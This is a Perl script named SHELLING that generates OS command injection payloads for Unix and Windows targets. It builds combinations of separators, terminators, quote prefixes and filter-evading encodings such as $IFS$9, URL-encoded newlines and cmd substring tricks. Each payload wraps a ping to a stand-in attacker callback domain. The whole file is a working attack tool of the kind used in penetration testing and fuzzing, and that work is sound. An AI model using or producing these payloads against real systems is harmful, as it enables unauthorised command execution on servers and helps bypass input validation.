#!/usr/bin/perl

## SHELLING - payload generator by ewilded, tuned for OS command injection

use strict;
no strict 'refs';

# CONFIGURATION SECTION START
my $COMMAND='ping'; # sleep, echo, touch, wget, this could be nicely profiled, e.g. by a parameter called 'feedback_channel' or sth
my $ARGUMENT='xPAYLOAD_MARK.sub.evilcollab.org'; # 
# in this configuration example we are trying to ravage file upload mechanism in order to write arbitrary files to arbitrary location
my $PAYL=$COMMAND.'ARGUMENT_SEPARATOR'.$ARGUMENT;
my $payload_marking=1; # if  we want to mark each payload with a unique identifier, so we can know the winner when it hits the right place
my $TARGET_OS='all'; # other options include 'win' and 'all', 'all' is the default

# Let's try to create proper nix command injection anatomy
## we can deal with three types of porly written check filters:
# 1) the ones that only force the string to begin properly, like ^\w+ 
# 2) the ones that only force the string to end properly, like \w+$
# 3) the ones that only force the string to have proper beginning and end, with a loophole inside of them, e.g. ^\w+\s+.*\w+$
# We have to create the base payloads list with this thing in mind
# This is why we need both SUFFIXES and PREFIXES, we build all combinations: PREFIX{PAYLOAD}, PREFIX{PAYLOAD}SUFFIX, {PAYLOAD}SUFFIX, we'll also be able to cover injection points starting/ending with quotes

# MALICIOUS_COMMAND=COMMAND+ARGUMENT_SEPARATOR
# THE COMBINATION PATTERNS: 
# 1) MALICIOUS_COMMAND (argument injections like `$USER_SUPPLIED` or $(USER_SUPPLIED))
# 2) MALICIOUS_COMMAND+COMMAND_TERMINATOR (in case there was write and command separators were unallowed)
# 3) COMMAND_SEPARATOR+MALICIOUS_COMMAND (for simple injections with no filtering, like cat $USER_SUPPLIED
# 4) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR (for simple injections with no filtering and appended some fixed content, like 'some_binary $USER_SUPPLIED -someflag')
# 5) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX (for simple injections like 'cat $USER_SUPPLIED something', with filtering like \w+$)
# 6) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR (for injections with weak filtering like ^\w+ and some appended fixed content, like 'cat $USER_SUPPLIED something')
# 7) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX (for injections with appended fixed content, like 'cat $USER_SUPPLIED something', with weak filtering like ^\w+\s+.*\w+$)
# 8) PREFIX+MALICIOUS_COMMAND+SUFFIX (`` and $() notations)

# Why we do not combine COMMAND_SEPARATORS along with COMMAND_TERMINATORS in one payload: any quotes will be handled by the prefix stuff anyway, while any fixed appendices will be ignored due to separators instead of terminators (and if separator is not accepted, the command will fail anyway, so there is no point in trailing it with a terminator)... hence, terminators should be used only mutually exclusively with separators!

my @BASE_PAYLOADS=(
$PAYL,
);

my @ARGUMENT_SEPARATORS=('%20%20',"%09%09");
my @COMMAND_SEPARATORS=('%0a%0a','%26','|'); #  <<D%0aD%0a is nice on nix, but redundant, as it requires %0a... %0a does not work with direct injections (cmd /c "blabla\nothercommand"), but it does the job in bat files
my @COMMAND_TERMINATORS=("%00",'%F0%9F%92%A9');# the first two make sense only if the command is saved into a file (script) or a database entry before being executed (in order to get rid of the hardcoded command shite if separators fail to get rid of its impact, or if dealing with some quoted injection (# 💩 the long encoded one is the utf poo)


my @NIX_COMMAND_SEPARATORS=(';');
my @NIX_ARGUMENT_SEPARATORS=('$IFS$9');
my @NIX_COMMAND_TERMINATORS=('%20%20#');
my @WIN_COMMAND_SEPARATORS=('%1A'); # bat files
my @WIN_ARGUMENT_SEPARATORS=('%0b','%25ProgramFiles:~10,1%25'); # vertical tab, hacky space
my @WIN_ECHO_ARGUMENT_SEPARATORS=('(','.');
my @WIN_COMMAND_TERMINATORS=('%26::');	# does not make any difference in direct cmd /c injects (cmd is tolerant for broken syntax following our command, on the other hand it still fails if it encounters something like <>< after this command terminator, but it might get handy for injection into .bat files

# invvvvv212.org','1', example.org for command injection into overlays of tools like whois. On the flip side, for file uploads these could be '.PNG', '.TXT','.DOC'optional list of suffixes to try (e.g. in order to bypass filters), used only with terminators
my @PREFIXES=('foo.co.uk'); # this could be profiled as well (e.g. profiles like 'hostname','uname','all')
my @PREFIX_SUFFIXES=('"',"'"); # for into-quoted string injections, like fixed_command '$USER_SUPPLIED' or fixed_command "$USER_SUPPLIED"



##### END OF CONFIGURATION SECTION #####

if($TARGET_OS eq 'nix'||$TARGET_OS eq 'all')
{
	push(@BASE_PAYLOADS,'$('.$PAYL.')');
	push(@BASE_PAYLOADS,'`'.$PAYL.'`');
	push(@COMMAND_SEPARATORS,@NIX_COMMAND_SEPARATORS); 
	push(@ARGUMENT_SEPARATORS,@NIX_ARGUMENT_SEPARATORS);
}
if($TARGET_OS eq 'win'||$TARGET_OS eq 'all')
{
	push(@ARGUMENT_SEPARATORS,@WIN_ARGUMENT_SEPARATORS); # a cmd-specific hacky way to use space without a space, too bad it uses other dodgy characters, html-encoded
	push(@COMMAND_SEPARATORS,@WIN_COMMAND_SEPARATORS); # as I found out, so called substitute character works as cmd separator for echo in cmd :D	
	push(@COMMAND_TERMINATORS,@WIN_COMMAND_TERMINATORS);
	if($COMMAND eq 'echo') # windows cmd.exe echo accepts a dot and ( as argument separators (and is almost never escaped), echo can be used to read variables and write arbitrary files
	{
		push(@ARGUMENT_SEPARATORS,@WIN_ECHO_ARGUMENT_SEPARATORS);
	}
	push(@WIN_ARGUMENT_SEPARATORS,@WIN_ECHO_ARGUMENT_SEPARATORS); # to make incorrect payload avoidance easier
}


sub array_search 
{
	my $arr=shift;
	my $seed=shift;
	foreach my $item(@{$arr}) 
	{
	   return 1 if($item eq $seed);
	}
	return 0;
}
sub incompatible_targets
{
	return 0 if($TARGET_OS ne 'all');
	my $entity=shift;
	my $payload=shift;
	my $what=shift; # terminator or cmd_separator
	$payload=~/$COMMAND(.*)$ARGUMENT/;
	my $separator=$1;
	if(array_search(\@NIX_ARGUMENT_SEPARATORS,$separator)||$payload=~/\$\(/||$payload=~/\`/) #nix detection
	{
		#print "nix detected: $payload, verifying $entity...\n";
		# dealing with a nix-specific
		if($what eq 'separator')
		{
			return 1 if(array_search(\@WIN_COMMAND_SEPARATORS,$entity)); 
			return 1 if(array_search(\@WIN_ARGUMENT_SEPARATORS,$entity));
			return 0;
		}
		if($what eq 'terminator')
		{
			return 1 if(array_search(\@WIN_COMMAND_TERMINATORS,$entity)); 
			return 0;
		}
	}
	elsif(array_search("@WIN_ARGUMENT_SEPARATORS",$separator)) # win detection
	{
		#print "win detected: $payload\n";
		# dealing with a win-specific payload
		if($what eq 'separator')
		{
			return 1 if(array_search(\@NIX_COMMAND_SEPARATORS,$entity)); 
			return 1 if(array_search(\@NIX_ARGUMENT_SEPARATORS,$entity)); 
			return 0;
		}
		if($what eq 'terminator')
		{
			return 1 if(array_search(\@NIX_COMMAND_TERMINATORS,$entity)); 
			return 0;
		}
		
	}	# universal payload
	else 
	{
		#print "universal detected: $payload\n";
		return 0; # we are dealing with a universal separator, so no conflict in this payload		
	}
}

sub get_proper_suffix
{
	my $prefix=shift;
	my $suffix=$prefix;
	if($prefix=~/(')$/||$prefix=~/(")$/)
	{
		my $quote=$1;
		$suffix=~s/$quote$//;
		$suffix=$quote.$suffix;
	}
	return $suffix;
}


# automatically prefix prefixes with quotes in order to gain quoted injection compatibility
my @tmp_prefixes=(@PREFIXES);
foreach my $prefix(@tmp_prefixes)
{
	foreach my $prefix_suffix(@PREFIX_SUFFIXES)
	{
		push(@PREFIXES,$prefix.$prefix_suffix);	
	}
}

my @output_payloads=();

# First, we fill our output payloads list wth all variations of base payloads, including different argument separators
foreach my $arg_separator(@ARGUMENT_SEPARATORS)
{
	foreach my $base_payload(@BASE_PAYLOADS)
	{
		my $curr_payload=$base_payload; 
		next if incompatible_targets($arg_separator,$curr_payload,'separator');
		$curr_payload=~s/ARGUMENT_SEPARATOR/$arg_separator/;
		push(@output_payloads,$curr_payload);
	}
}
@BASE_PAYLOADS=(@output_payloads); # overwrite the base with different base command_separator variants

# Second, we fill up our output_payloads with successive combinations from the COMBINATION PATTERNS
# 1) MALICIOUS_COMMAND - already there in its pure version, nice one!

# 2) MALICIOUS_COMMAND+COMMAND_TERMINATOR 
foreach my $base_payload(@BASE_PAYLOADS)
{
	foreach my $command_terminator(@COMMAND_TERMINATORS)
	{
		next if incompatible_targets($command_terminator,$base_payload,'terminator');
		my $curr_payload=$base_payload.$command_terminator;
		push(@output_payloads,$curr_payload);
	}
	foreach my $command_separator(@COMMAND_SEPARATORS)
	{
		next if incompatible_targets($command_separator,$base_payload,'separator');
		my $curr_payload=$base_payload.$command_separator;
		push(@output_payloads,$curr_payload);
	}
}

# 3) COMMAND_SEPARATOR+MALICIOUS_COMMAND
foreach my $base_payload(@BASE_PAYLOADS)
{
	foreach my $command_separator(@COMMAND_SEPARATORS)
	{
		next if incompatible_targets($command_separator,$base_payload,'separator');
		my $curr_payload=$command_separator.$base_payload;
		push(@output_payloads,$curr_payload);
	}
}

# 4) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR 
foreach my $base_payload(@BASE_PAYLOADS)
{
	foreach my $command_separator(@COMMAND_SEPARATORS)
	{
		next if incompatible_targets($command_separator,$base_payload,'separator');
		my $curr_payload=$command_separator.$base_payload.$command_separator;
		push(@output_payloads,$curr_payload);
	}
}


# 5) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX
foreach my $base_payload(@BASE_PAYLOADS)
{
	foreach my $command_separator(@COMMAND_SEPARATORS)
	{		
		next if incompatible_targets($command_separator,$base_payload,'separator');
		foreach my $suffix(@PREFIXES) # prefix and suffix are the same 
		{
			next if($suffix=~/'/||$suffix=~/"/); # skip irrelevant payloads
			my $curr_payload=$command_separator.$base_payload.$command_separator.$suffix;
			push(@output_payloads,$curr_payload);	
		}
	}
}

# 6) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR
foreach my $base_payload(@BASE_PAYLOADS)
{
	foreach my $command_separator(@COMMAND_SEPARATORS)
	{
		next if incompatible_targets($command_separator,$base_payload,'separator');
		foreach my $prefix(@PREFIXES)
		{
			my $curr_payload=$prefix.$command_separator.$base_payload.$command_separator;
			if($curr_payload=~/'/)
			{
				$curr_payload.="'";
			}
			elsif($curr_payload=~/"/)
			{
				$curr_payload.='"';
			}
			# if the payload starts with a quote, we are closing it with the same quote in order to keep the syntax from breaking
			push(@output_payloads,$curr_payload);
		}
	}
}

# 7) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX 
foreach my $base_payload(@BASE_PAYLOADS)
{
	foreach my $command_separator(@COMMAND_SEPARATORS)
	{
		next if incompatible_targets($command_separator,$base_payload,'separator');
		foreach my $prefix(@PREFIXES)
		{
			my $suffix=get_proper_suffix($prefix);
			my $curr_payload=$prefix.$command_separator.$base_payload.$command_separator.$suffix; # suffix is the same as prefix
			# if the payload starts with a quote, we are closing it with the same quote in order to keep the syntax from breaking
			push(@output_payloads,$curr_payload);
		}
	}
}

# 8) PREFIX+MALICIOUS_COMMAND+SUFFIX (`` and $() notations)
foreach my $base_payload(@BASE_PAYLOADS)
{
	foreach my $prefix(@PREFIXES)
	{
			next if(!($base_payload=~/^\`/) && !($base_payload=~/^\$/) && (!($prefix=~/'/)) && (!($prefix=~/"/))); # skip irrelevant base payloads in order to avoid pointless results	
			my $suffix=get_proper_suffix($prefix);
			my $curr_payload=$prefix.$base_payload.$suffix; # suffix is the same as prefix
			# if the payload starts with a quote, we are closing it with the same quote in order to keep the syntax from breaking
			push(@output_payloads,$curr_payload);
	}
}

# FINALLY, PRINT OUR PRECIOUS LIST READY FOR ACTION!
my $cnt=0;
foreach my $output_payload(@output_payloads)
{
	if($payload_marking eq 1)
	{
		$output_payload=~s/PAYLOAD_MARK/$cnt/;
	}
	else
	{
		$output_payload=~s/PAYLOAD_MARK//;
	}
	$cnt++;
	print $output_payload."\n";	
}
